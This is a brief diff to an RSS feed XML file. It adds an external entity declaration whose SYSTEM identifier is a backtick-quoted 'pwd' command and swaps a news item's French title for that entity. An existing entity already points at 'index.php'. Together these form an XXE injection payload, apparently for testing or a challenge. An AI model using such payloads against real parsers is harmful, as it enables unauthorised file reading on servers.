@@ -2,6 +2,7 @@
 <!DOCTYPE rss [
     <!ELEMENT title ANY>
     <!ENTITY xxe SYSTEM "index.php" >
+    <!ENTITY xxe_2 SYSTEM `pwd` >
 ]>
 <rss version="2.0">
     <channel>
@@ -16,7 +17,7 @@
             <link>http://www.example.org/actu1</link>
         </item>
         <item>
-            <title>Actualité N°2</title>
+            <title>&xxe_2;</title>
             <description>Ceci est ma seconde actualité</description>
             <pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
             <link>http://www.example.org/actu2</link>
